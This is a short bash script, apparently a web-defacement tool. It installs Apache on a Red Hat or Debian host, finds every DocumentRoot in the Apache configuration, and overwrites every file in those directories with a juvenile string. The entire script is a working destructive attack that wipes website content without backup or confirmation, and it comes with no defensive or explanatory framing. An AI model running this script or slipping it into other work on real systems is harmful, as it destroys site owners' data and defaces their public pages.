#!/usr/bin/env bash

PATH="/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"
defaceVal="balls :3"

#determine if redhat or debian based
if [ -f "/etc/redhat-release" ]; then
    yum install httpd -y
    webDir="/etc/httpd"
elif [ -f "/etc/debian_version" ]; then
    apt-get install apache2 -y
    webDir="/etc/apache2"
else
    echo "failed install, not red hat or debian."
    exit -1
fi

webDirs="$(grep -RhP "^\s+DocumentRoot.*" "$webDir" | awk '{print $2}' | sort | uniq)"

#overwrite all files in every web dir with $defaceVal
for dir in $webDirs; do
    cd "$dir"
    for file in $(ls); do
        if [ ! -d "$file" ]; then
            echo "$defaceVal" > "$file"
        fi
    done
done
